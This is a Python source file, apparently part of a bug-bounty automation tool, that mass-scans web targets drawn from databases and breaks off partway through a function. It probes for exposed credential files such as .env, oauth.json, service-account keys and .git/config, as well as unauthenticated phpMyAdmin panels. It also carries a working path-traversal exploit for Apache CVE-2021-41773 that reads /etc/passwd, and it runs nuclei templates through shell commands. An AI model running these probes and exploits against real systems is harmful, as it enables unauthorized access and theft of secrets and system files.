# Here we design and implement our vulnerability checks or functions
# function names are categories with numbers
# each function checks for a specific vulnerability on a group of targets or urls
# test = lambda x : True if (x > 10 and x < 20) else False => test(1) -> False 

# REQ TO THIS : 
# http://0000nlm6c0j53v2s668g61398133715me.interact.sh/
# WILL REPLY AS : 
# em51733189316g866s2v35j0c6mln0000


from SOURCE.DBHandler import dbConnect,dbDisconnect,inserToVULNS,dbPath
from SOURCE.doubleCheck import updateTargetDC
from os import listdir
import os
from progress.bar import IncrementalBar
# from googlesearch import search
from time import sleep
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from SOURCE.SlackFetch import *
from SOURCE.ConcurrentPowers import multiprocessing, multithreading
import urllib.request,requests,random,socket,ssl,dns.resolver
from subprocess import getoutput
from py_essentials import hashing as hs
import subprocess
from alive_progress import alive_bar



#**************************************#
# AUXILIARY MODULES, these modules are used in attack modules
def screamBugs(vulnMSG):
  # Let's scream the bug in slack vulns channel so tupi can read it
  slackChan = "vulns"
  try:
    slackFetch(slackChan, vulnMSG)
  # # except Exception as e:
  #   # print(f"EXCEPTION: {e}")
  except:
    pass

# Launches attacks with custom conditions sent to it
def targetAttackLauncher(myKeyI,vulnCatI,vulnNameI,severityI,vulnDscI,vulnPathI,fullPayloadI,progScopeI,urlListI,redirAllow,conditionI,customHeadersI,reqMethodI,postDataI):
  myKey = myKeyI
  vulnCat = vulnCatI
  vulnName = vulnNameI
  severity = severityI
  vulnDsc = vulnDscI
  vulnPath = vulnPathI
  fullPayload = fullPayloadI
  postData = postDataI
  if len(reqMethodI) == 0: # defaults to this, backwards compatibility
    reqMethod = "GET"
  elif len(reqMethodI) > 0:
    reqMethod = reqMethodI

  prog = progScopeI
  
  if prog == "":
    exit()
  elif prog == "exit":
    return False
  elif prog == "all":
    programs = listdir(dbPath)
    random.shuffle(programs)
    bar = IncrementalBar(f'Exploiter.py => {vulnName}()', max=len(programs))

    for progName in programs:
      # input(f"progName : {progName}")
      try:
        conn = dbConnect(progName)
        cur = conn.cursor()
        cur.execute(f'''
                    SELECT targetURI,progAdr
                    FROM TARGETS where keyID IS NULL OR keyID not like "%{myKey}%"
                    ORDER BY RANDOM() limit 40
                    ''')
        results = cur.fetchall()
        dbDisconnect(conn)
        
        if len(results) != 0:
          bar2 = IncrementalBar(f'Exploiter.py => {vulnName}()', max=len(results))
          for item in results:
            progAdr = item[1]
            targetURI = item[0]

            try:
              urlList = urlListI
              for candidateURI in urlList:
                fullURLTxt = str(targetURI) + candidateURI
                headers = {}
                if len(customHeadersI) > 0:
                  headers |= customHeadersI
                  headers |= {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'}
                else:
                  headers |= {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'}
                
                if len(postData) == 0:                
                  r = requests.request(reqMethod,fullURLTxt,headers=headers,allow_redirects=redirAllow,verify=False,timeout=2)
                elif len(postData) > 0:
                  r = requests.request(reqMethod,fullURLTxt,data=postData,headers=headers,allow_redirects=redirAllow,verify=False,timeout=2)
                
                if conditionI(r):
                  vulnPath = fullURLTxt
                  fullPayload = (r.text[:7000])
                  
                  print(f"Found Vunerable!!! : {vulnName} => {vulnPath}")
                  
                  inserToVULNS(progName,progAdr,targetURI,fullURLTxt,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload)
                  
                  screamBugs(f"-------------------------------------\n$$$$$ CONGRATS TUPI $$$$$\n=========================\nprogName: {progName}\nprogAdr: {progAdr}\ntargetURI: {targetURI}\nfullURLTxt: {fullURLTxt}\nvulnCat: {vulnCat}\nvulnName: {vulnName}\nseverity: {severity}\nvulnDsc: {vulnDsc}\nvulnPath: {vulnPath}\n-------------------------------------")
                  
                  # updateTargetDC(progName,progAdr,targetURI,myKey)
                  break
                # else:
                #   # print(f"AHHH, NOTHING!, statusCODE = {r.status_code}")
                #   pass
            # except Exception as e:
            #   print(f"EXCEPTION: {e}")
            except:
              pass
            finally:
            #   # We don't wanna check this target again regardless of vulnerablity results
              updateTargetDC(progName,progAdr,targetURI,myKey)
            bar2.next()
          bar2.finish()
      # except Exception as e:
      #   print(f"EXCEPTION: {e}")
      except:
        pass
      bar.next()
    bar.finish()
  else:
    progName = prog
    try:
      conn = dbConnect(progName)
      cur = conn.cursor()
      cur.execute(f'''
                  SELECT targetURI,progAdr
                  FROM TARGETS where keyID IS NULL OR keyID not like "%{myKey}%"
                  ORDER BY RANDOM() limit 40
                  ''')
      results = cur.fetchall()
      # input(f"results is now : {results}")
      dbDisconnect(conn)
      
      if len(results) != 0:
        bar = IncrementalBar(f'Exploiter.py => {vulnName}()', max=len(results))
        for item in results:
          progAdr = item[1]
          targetURI = item[0]
  
          try:
            urlList = urlListI
            for candidateURI in urlList:
              fullURLTxt = str(targetURI) + candidateURI
              headers = {}
              if len(customHeadersI) > 0:
                
                headers |= customHeadersI
                headers |= {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'}
              
              else:
                headers |= {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'}
              
              if len(postData) == 0:      
                # r = requests.get(url=fullURLTxt,headers=headers,allow_redirects=redirAllow,verify=False,timeout=4)
                r = requests.request(reqMethod,fullURLTxt,headers=headers,allow_redirects=redirAllow,verify=False,timeout=2)
              elif len(postData) > 0:
                # r = requests.request(method=reqMethod,url=fullURLTxt,data=postData,headers=headers,allow_redirects=redirAllow,verify=False,timeout=4)
                r = requests.request(reqMethod,fullURLTxt,data=postData,headers=headers,allow_redirects=redirAllow,verify=False,timeout=2)
                
              if conditionI(r):
                vulnPath = fullURLTxt
                fullPayload = (r.text[:7000])
                
                print(f"Found Vunerable!!! : {vulnName} => {vulnPath}")
                
                inserToVULNS(progName,progAdr,targetURI,fullURLTxt,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload)
                
                screamBugs(f"-------------------------------------\n$$$$$ CONGRATS TUPI $$$$$\n=========================\nprogName: {progName}\nprogAdr: {progAdr}\ntargetURI: {targetURI}\nfullURLTxt: {fullURLTxt}\nvulnCat: {vulnCat}\nvulnName: {vulnName}\nseverity: {severity}\nvulnDsc: {vulnDsc}\nvulnPath: {vulnPath}\n-------------------------------------")
                
                # updateTargetDC(progName,progAdr,targetURI,myKey)
                break
                
              # This breaks out of urlList for loop
              
              # else:
              #   # print(f"AHHH, NOTHING!, statusCODE = {r.status_code}")
              #   pass
          # except Exception as e:
          #   print(f"EXCEPTION: {e}")
          except:
            pass
          finally:
            # We don't wanna check this target again regardless of vulnerablity results
            updateTargetDC(progName,progAdr,targetURI,myKey)
          bar.next()
        bar.finish()
    # except Exception as e:
    #   print(f"EXCEPTION: {e}")
    except:
      pass


# Custom attack module running nuclei on its behalf
###################################################
def nucLauncher(progName, progAdr, targetName, templateName, myKey):
  os.system(f'rm -fr /tmp/hm*')
  print("Launched nuks with details : ")
  print(f"=>progName:{progName}\ntargetName:{targetName}\ntemplateName={templateName}\n------------")

  try:
    with alive_bar(8) as bar:
      tempo = progAdr
      progAdr = "nucleiGENERATED"
      # input("INSIDE NUCLAUNCHER")
    # def nucLauncher(myKeyI,vulnCatI,vulnNameI,severityI,vulnDscI,vulnPathI,fullPayloadI,progScopeI,urlListI,redirAllow,conditionI,customHeadersI,reqMethodI,postDataI):
      # myKey = myKeyI
      vulnCat = (os.popen(f'cat {templateName} | grep "tags" | cut -d ":" -f 2').read()).strip()
      bar()
      vulnName = (os.popen(f'cat {templateName} | grep "id" | cut -d ":" -f 2').read()).strip()
      bar()
      severity = (os.popen(f'cat {templateName} | grep "severity" | cut -d ":" -f 2').read()).strip()
      bar()
      vulnDsc = (os.popen(f'cat {templateName} | grep "name" | cut -d ":" -f 2').read()).strip()
      bar()
      vulnPath = ""
      # fullPayload = ""
      # postData = postDataI
      # if len(reqMethodI) == 0: # defaults to this, backwards compatibility
      #   reqMethod = "GET"
      # elif len(reqMethodI) > 0:
      #   reqMethod = reqMethodI

      # Lets run it
      randOut = ((os.popen('head -c 10 /dev/urandom | sha1sum').read()).strip()).strip(' -')
      bar()
      # process = subprocess.getstatusoutput([f'nuclei -timeout 2 -retries 0 -es info -H \'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36. Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36\' -u {targetName} -t {templateName} -o {randOut}'])
      process = subprocess.getstatusoutput([f'nuclei -timeout 2 -retries 0 -H \'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36. Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36\' -l {targetName} -t {templateName} -o {randOut}'])
      bar()
      
      fullPayload = vulnPath
      # fullURLTxt = targetName
      # targetURI = targetName
      fullURLTxt = progAdr
      targetURI = progAdr

      # If execution is successful and we have vulnerabilities
      if (process[0] == 0) and (os.stat(randOut).st_size != 0):
        vulnPath = (os.popen(f'cat {randOut} | cut -d \' \' -f 6').read()).strip()

        # clear the file

        # Let's announce we had a bug
        print(f"Found Vunerable!!! : {vulnName} => {vulnPath}")
    #    fullPayload = vulnPath
    #    fullURLTxt = targetName
    #    targetURI = targetName

        inserToVULNS(progName,progAdr,targetURI,fullURLTxt,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload)
        screamBugs(f"-------------------------------------\n$$$$$ CONGRATS TUPI $$$$$\n=========================\nprogName: {progName}\nprogAdr: {progAdr}\ntargetURI: {targetURI}\nfullURLTxt: {fullURLTxt}\nvulnCat: {vulnCat}\nvulnName: {vulnName}\nseverity: {severity}\nvulnDsc: {vulnDsc}\nvulnPath: {vulnPath}\n-------------------------------------")

      os.system(f'rm -f {randOut}')
      bar()

      # Lets get targets ready for their keys :D
      # with open(targetName, 'r') as f2:
      #   lines = [line for line in f2]
      
      for targetz in tempo:
        targetURI = targetz[0].strip('\n')
        progAdr = targetz[1].strip('\n')
        # input(f"Updating target : {targetURI}")
        updateTargetDC(progName,progAdr,targetURI,myKey)
      
      os.system(f'rm -f {targetName}')
      bar()
  except Exception as e:
    print(f"EXCEPTION : {e}")

def runner(tar, temp):
  # Lets find all the templates
  # input("INSID RUNNER")
  dir_path = "/home/tup/nuclei-templates"
  res = []
  ext = ["yaml","yml"]
  for root, dirs, files in os.walk(dir_path):
    for file in files:
      if file.endswith(tuple(ext)):
        res.append(os.path.join(root, file))
  
  if (tar == "all") and (temp == "all"):
    random.shuffle(res)
    random.shuffle(res)
    random.shuffle(res)
    for templateItem in res:
      myKey = hs.fileChecksum(templateItem,"sha1")
      programs = listdir(dbPath)
      random.shuffle(programs)

      bar = IncrementalBar(f'nucLauncher.py => Launched NUKS !', max=len(programs))
      for progName in programs:
        # input(f"progName : {progName}")
        try:
          conn = dbConnect(progName)
          cur = conn.cursor()
          cur.execute(f'''
                      SELECT targetURI,progAdr
                      FROM TARGETS where keyID IS NULL OR keyID not like "%{myKey}%"
                      ORDER BY RANDOM() limit 400
                      ''')
          results = cur.fetchall()
          dbDisconnect(conn)
          
          if len(results) != 0:
            # bar2 = IncrementalBar(f'nucLauncher.py => Launched NUKS !', max=len(results))
            randOut = ((os.popen('head -c 10 /dev/urandom | sha1sum').read()).strip()).strip(' -')
            progAdr = results
            with open(randOut, 'w') as f:
              # progAdr = results[0][1]
              # targetURI = results[0][0]
              for item in results:
                f.write(f"{item[0]}\n")
                
            nucLauncher(progName, progAdr, randOut, templateItem, myKey)
        except Exception as e:
          print(f"EXCEPTION : {e}")
        bar.next()
      bar.finish()
  elif (tar == "all") and (temp != "all"):
    programs = listdir(dbPath)
    random.shuffle(programs)

    bar = IncrementalBar(f'nucLauncher.py => Launched NUKS !', max=len(programs))
    for progName in programs:
      # input(f"progName : {progName}")
      try:
        conn = dbConnect(progName)
        cur = conn.cursor()
        
        myKey = hs.fileChecksum(temp,"sha1")

        cur.execute(f'''
                    SELECT targetURI,progAdr
                    FROM TARGETS where keyID IS NULL OR keyID not like "%{myKey}%"
                    ORDER BY RANDOM() limit 400
                    ''')
        results = cur.fetchall()
        dbDisconnect(conn)
        
        if len(results) != 0:
          # bar2 = IncrementalBar(f'nucLauncher.py => Launched NUKS !', max=len(results))
          # for item in results:
          #   progAdr = item[1]
          #   targetURI = item[0]
            
          #   nucLauncher(progName, progAdr, targetURI,temp,myKey)
          randOut = ((os.popen('head -c 10 /dev/urandom | sha1sum').read()).strip()).strip(' -')
          # progAdr = results[0][1]
          progAdr = results
          with open(randOut, 'w') as f:
            # targetURI = results[0][0]
            for item in results:
              f.write(f"{item[0]}\n")
          templateItem = temp
          nucLauncher(progName, progAdr, randOut, templateItem, myKey)

      # except:
      #   pass
      except Exception as e:
        print(f"EXCEPTION : {e}")
      bar.next()
    bar.finish()
  elif (tar != "all") and (temp == "all"):
    random.shuffle(res)
    random.shuffle(res)
    random.shuffle(res)
    for templateItem in res:

      try:
        # progName = dbPath + tar
        progName = tar
        conn = dbConnect(progName)
        cur = conn.cursor()
        
        myKey = hs.fileChecksum(templateItem,"sha1")

        cur.execute(f'''
                    SELECT targetURI,progAdr
                    FROM TARGETS where keyID IS NULL OR keyID not like "%{myKey}%"
                    ORDER BY RANDOM()
                    ''')
        results = cur.fetchall()
        dbDisconnect(conn)
        
        if len(results) != 0:
          # bar = IncrementalBar(f'nucLauncher.py => Launched NUKS !', max=len(programs))
          # bar2 = IncrementalBar(f'nucLauncher.py => Launched NUKS !', max=len(results))
          # for item in results:
          #   progAdr = item[1]
          #   targetURI = item[0]
            
          #   nucLauncher(progName, progAdr, targetURI, templateItem, myKey)
            # bar.next()
          # bar.finish()
          randOut = ((os.popen('head -c 10 /dev/urandom | sha1sum').read()).strip()).strip(' -')
          # progAdr = results[0][1]
          progAdr = results
          with open(randOut, 'w') as f:
            # targetURI = results[0][0]
            for item in results:
              f.write(f"{item[0]}\n")
              
          nucLauncher(progName, progAdr, randOut, templateItem, myKey)

      # except:
      #   pass
      except Exception as e:
        print(f"EXCEPTION : {e}")
  elif (tar != "all") and (temp != "all"):
    try:
      # progName = dbPath + tar
      progName = tar
      conn = dbConnect(progName)
      cur = conn.cursor()
      myKey = hs.fileChecksum(temp,"sha1")

      cur.execute(f'''
                  SELECT targetURI,progAdr
                  FROM TARGETS where keyID IS NULL OR keyID not like "%{myKey}%"
                  ORDER BY RANDOM()
                  ''')
      results = cur.fetchall()
      dbDisconnect(conn)
      
      if len(results) != 0:
        # bar2 = IncrementalBar(f'nucLauncher.py => Launched NUKS !', max=len(results))
        # for item in results:
        #   progAdr = item[1]
        #   targetURI = item[0]
          
        #   nucLauncher(progName, progAdr, targetURI,temp,myKey)
        randOut = ((os.popen('head -c 10 /dev/urandom | sha1sum').read()).strip()).strip(' -')
        with open(randOut, 'w') as f:
          # progAdr = results[0][1]
          progAdr = results
          # targetURI = results[0][0]
          for item in results:
            f.write(f"{item[0]}\n")
        templateItem = temp
        nucLauncher(progName, progAdr, randOut, templateItem, myKey)
        # os.system(f'rm -vf {randOut}')
    # except Exception as e:
    #   input(e)
    # except :
    #   pass
    except Exception as e:
      print(f"EXCEPTION : {e}")




###################################################

#**************************************#
#**************************************#
# ATTACK MODULES
##################
# ATTACK MODULES WITH KEYIDS ARE LOCATED HERE

#**************************************#
# INFO DOSCLOSURES
##################
## TUPI WAS HERE :D

# /yahoo_site_admin/credentials/db.conf exposures
def infoDisclo13(progScope):
  myKey = "84219c103d6b5fb10cc74884acd4834f"
  vulnCat = "Information Disclosure"
  vulnName = "infoDisclo13"
  severity = "P1"
  vulnDsc = "/yahoo_site_admin/credentials/db.conf file if accessible contains credentials"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/yahoo_site_admin/credentials/db.conf']
  redirAllow = False
  condition = lambda z : True if ((z.status_code == 200) and (('dbcredentials' in z.text) )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# /oauth.json exposures
def infoDisclo12(progScope):
  myKey = "4f6313fe3a197417baed64eef1f79d1a"
  vulnCat = "Information Disclosure"
  vulnName = "infoDisclo12"
  severity = "P1"
  vulnDsc = "/oauth.json file if accessible contains credentials"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/oauth.json']
  redirAllow = False
  condition = lambda z : True if ((z.status_code == 200) and (('client_secret' in z.text) or ('private_key' in z.text) )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# /oauth-credentials.json exposures
def infoDisclo11(progScope):
  myKey = "3fe2a71be99ce98db4ce8def8ca0cffa"
  vulnCat = "Information Disclosure"
  vulnName = "infoDisclo11"
  severity = "P1"
  vulnDsc = "/oauth-credentials.json file if accessible contains credentials"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/oauth-credentials.json']
  redirAllow = False
  condition = lambda z : True if ((z.status_code == 200) and (('client_secret' in z.text) or ('private_key' in z.text) )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# /service-account-credentials.json exposure
def infoDisclo10(progScope):
  myKey = "62fc08555f7fc2a30c5cc072ea5dd785"
  vulnCat = "Information Disclosure"
  vulnName = "infoDisclo10"
  severity = "P1"
  vulnDsc = "/service-account-credentials.json file if accessible contains credentials"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/service-account-credentials.json']
  redirAllow = False
  condition = lambda z : True if ((z.status_code == 200) and (('"private_key_id"' in z.text) and ('"private_key"' in z.text) and 'BEGIN PRIVATE KEY' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

#  /credentials.json exposures
def infoDisclo9(progScope):
  myKey = "b520b16219f7961ce979b9efea303338"
  vulnCat = "Information Disclosure"
  vulnName = "infoDisclo9"
  severity = "P1"
  vulnDsc = "/credentials.json file if accessible contains credentials"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/credentials.json']
  redirAllow = False
  condition = lambda z : True if ((z.status_code == 200) and (('client_secret' in z.text) or ('private_key' in z.text) )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# Look for /config/ folders
def infoDisclo8(progScope):
  myKey = "28df63881046e4200a098432b83c3751"
  vulnCat = "Information Disclosure"
  vulnName = "infoDisclo8"
  severity = "P3"
  vulnDsc = "/config/ folder if accessible contains credentials"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/config/']
  redirAllow = False
  condition = lambda z : True if ((z.status_code == 200) and ('<title>Index of /config' in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# Look for /settings.php config files info disclosures
def infoDisclo7(progScope):
  myKey = "b4eb39a74fae8578e9f5e701595239f8"
  vulnCat = "Information Disclosure"
  vulnName = "infoDisclo7"
  severity = "P2"
  vulnDsc = "'/settings.php' with multiple variants like .bak or .txt, etc."
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  # urlList = ['/settings.php.bak','/settings.php.dist','/settings.php.old','/settings.php.save','/settings.php.swp','/settings.php.txt']
  urlList = ['/settings.php.bak']
  redirAllow = False
  condition = lambda z : True if ((z.status_code == 200) and ('DB_NAME' in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)
  
# Look for env config files info disclosures
def infoDisclo6(progScope):
  myKey = "a27cffc49773b7ed6ff534eb953d106c"
  vulnCat = "Information Disclosure"
  vulnName = "infoDisclo6"
  severity = "P1/P2"
  vulnDsc = "'/.env' if found is a BUG that leaks critical info like database/email passwords"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.env']
  redirAllow = False
  condition = lambda z : True if ((z.status_code == 200) and ('APP_PASSWORD' in z.text and 'DB_DATABASE' in z.text and 'APP_URL' in z.text and 'DB_host' in z.text and 'APP_ENV' in z.text and 'APP_KEY' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)
  
# Look for /phpinfo paths info disclosures
def infoDisclo5(progScope):
  myKey = "61b5caee5088b1ce3b4b6115327f0c03"
  vulnCat = "Information Disclosure"
  vulnName = "infoDisclo5"
  severity = "P4"
  vulnDsc = "/phpinfo.php if found is a BUG that leaks php info."
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  # urlList = ['/phpinfo.php','/phpinfo']
  urlList = ['/phpinfo.php']
  redirAllow = False
  condition = lambda z : True if ((z.status_code == 200) and ('document_root' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)
                    
# Look for /server-status apache pages disclosures
def infoDisclo4(progScope):
  myKey = "2186220ebcd577224a3dfef4ec7d3f5e"
  vulnCat = "Information Disclosure"
  vulnName = "infoDisclo4"
  severity = "P4"
  vulnDsc = "/server-status if found is a BUG that leaks apache info."
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/server-status']
  redirAllow = False
  condition = lambda z : True if ((z.status_code == 200) and ('<title>apache' in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# Look for open or restricted .git exposed folders
def infoDisclo3(progScope):
  # input("Inside infoDisclo3...")
  myKey = "4185f643316497fc333e74aa72613931"
  vulnCat = "Information Disclosure"
  vulnName = "infoDisclo3"
  severity = "P4/P3"
  vulnDsc = "/.git/ is either 403 or 200, we collect them. 404 means failed and no action, pass."
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/.git/config']
  redirAllow = False
  condition = lambda z : True if ((z.status_code == 200) and ('[core]' in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# Look for open phpmyadmin panels without authentication
def infoDisclo2(progScope):
  # Look for open phpmyadmin panels without authentication
  myKey = "a1d931bd1958ac2ca00494d8b4e61d95"
  vulnCat = "Information Disclosure"
  vulnName = "infoDisclo2"
  severity = "P1"
  vulnDsc = "/phpmyadmin or other variants of its path are open to auth attacks, here we check for no auth ones!"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  # urlList = ['/phpmyadmin/main.php','/phpMyAdmin/main.php']
  urlList = ['/phpmyadmin/main.php']
  redirAllow = False
  condition = lambda z : True if ((z.status_code == 200) and ('sql' in z.text) and ('phpmyadmin' in z.text) and ('databases' in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# Look for /scripts folders
def infoDisclo1(progScope):
  myKey = "b6b97a191c3a4552f5c5bd70059bc5bb"
  vulnCat = "Information Disclosure"
  vulnName = "infoDisclo1"
  severity = "P4"
  vulnDsc = "/scripts folder if browsable or accessible is an open window for attacks"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/scripts']
  redirAllow = False
  condition = lambda z : True if ((z.status_code == 200) and ('<title>index' in z.text)) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

#**************************************#
# CVEs
##################
# Looks for CVE-2021-41773 apache path traversal
def CVE1(progScope):
  myKey = "7e2c6198d834a4b1c95f681a0278c21d"
  vulnCat = "Path Traversal"
  vulnName = "CVE1"
  severity = "P1/P2"
  vulnDsc = "Apache version 2.4.49 has a nasty Path Traversal Vuln"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""

  # prog = # input("Enter program name or \"all\" or \"exit\":")
  prog = progScope
  
  if prog == "":
    exit()
  elif prog == "exit":
    return False
  elif prog == "all":
    programs = listdir(dbPath)
    random.shuffle(programs)
    bar = IncrementalBar('Exploiter.py => CVE1()', max=len(programs))
    # system("clear")
    for progName in programs:
      # input(f"progName : {progName}")
      try:
        conn = dbConnect(progName)
        cur = conn.cursor()
        cur.execute(f'''
                    SELECT targetURI,progAdr
                    FROM TARGETS where keyID IS NULL OR keyID not like "%{myKey}%"
                    ORDER BY RANDOM() limit 85
                    ''')
        results = cur.fetchall()
        # input(f"results is now : {results}")
        dbDisconnect(conn)
        
        if len(results) != 0:
          # system("clear")
          bar2 = IncrementalBar('Exploiter.py => CVE1()', max=len(results))
          for item in results:
            progAdr = item[1]
            targetURI = item[0]
            # input(f"\nprogAdr = {progAdr} and targetURI = {targetURI}")
            # input(f"item is now : {item[0]}")
            # input(f"doTARGETDC : {progName,progAdr,targetURI,myKey}")
            # if not doTargetDC(progName,progAdr,targetURI,myKey):
            # input("\nLETS RUN ATTACK ON THIS TARGET!")
            try:
              candidateURI = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\n"
              
              fullURLTxt = str(targetURI) + candidateURI
              headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'}
              # print(f"\nLet's check for /scripts on {targetURI}")
              req = urllib.request.Request(url=fullURLTxt,headers=headers)
              gcontext = ssl.SSLContext()  # Only for gangstars
              r = urllib.request.urlopen(req, timeout=2, context=gcontext)
              # r = requests.get(url=fullURLTxt,headers=headers,allow_redirects=False,verify=False,timeout=5)
              # input(f"r.status_code is now : {r.status_code}")
              resBody = r.read().decode('utf-8')
              if (r.status == 200) and ('root:x:0:0:' in str(resBody).lower()):
                vulnPath = fullURLTxt
                fullPayload = resBody
                
                inserToVULNS(progName,progAdr,targetURI,fullURLTxt,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload)
                
                screamBugs(f"-------------------------------------\n$$$$$ CONGRATS TUPI $$$$$\n=========================\nprogName: {progName}\nprogAdr: {progAdr}\ntargetURI: {targetURI}\nfullURLTxt: {fullURLTxt}\nvulnCat: {vulnCat}\nvulnName: {vulnName}\nseverity: {severity}\nvulnDsc: {vulnDsc}\nvulnPath: {vulnPath}\n-------------------------------------")

              updateTargetDC(progName,progAdr,targetURI,myKey)
              # except Exception as e:
                # print(f"EXCEPTION: {e}")
            except urllib.error.URLError as e:
              updateTargetDC(progName,progAdr,targetURI,myKey)
              # print(f"EXCEPTION1 : {e}")
            except socket.timeout as e:
              # updateTargetDC(progName,progAdr,targetURI,myKey)
              # print(f"EXCEPTION2 : {e}")
              pass
            except ConnectionResetError as e:
              # updateTargetDC(progName,progAdr,targetURI,myKey)
              # print(f"EXCEPTION3 : {e}")
              pass
            except:
              pass
            bar2.next()
          bar2.finish()
      # except Exception as e:
        # print(f"EXCEPTION: {e}")
      except:
        pass
      bar.next()
    bar.finish()
  else:
    try:
      progName = prog
      conn = dbConnect(progName)
      cur = conn.cursor()
      cur.execute(f'''
                  SELECT targetURI,progAdr
                  FROM TARGETS where keyID IS NULL OR keyID not like "%{myKey}%"
                  ORDER BY RANDOM() limit 85
                  ''')

      results = cur.fetchall()
      dbDisconnect(conn)
      
      if len(results) != 0:
        # system("clear")
        bar = IncrementalBar('Exploiter.py => CVE1()', max=len(results))
        for item in results:
          progAdr = item[1]
          targetURI = item[0]
          # input(f"item is now : {item[0]}")
          # if not doTargetDC(progName,progAdr,targetURI,myKey):
          # input("\nLETS RUN ATTACK ON THIS TARGET!")
          try:
            candidateURI = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\n"
            
            fullURLTxt = str(targetURI) + candidateURI
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'}
            # print(f"\nLet's check for /scripts on {targetURI}")
            req = urllib.request.Request(url=fullURLTxt,headers=headers)
            gcontext = ssl.SSLContext()  # Only for gangstars
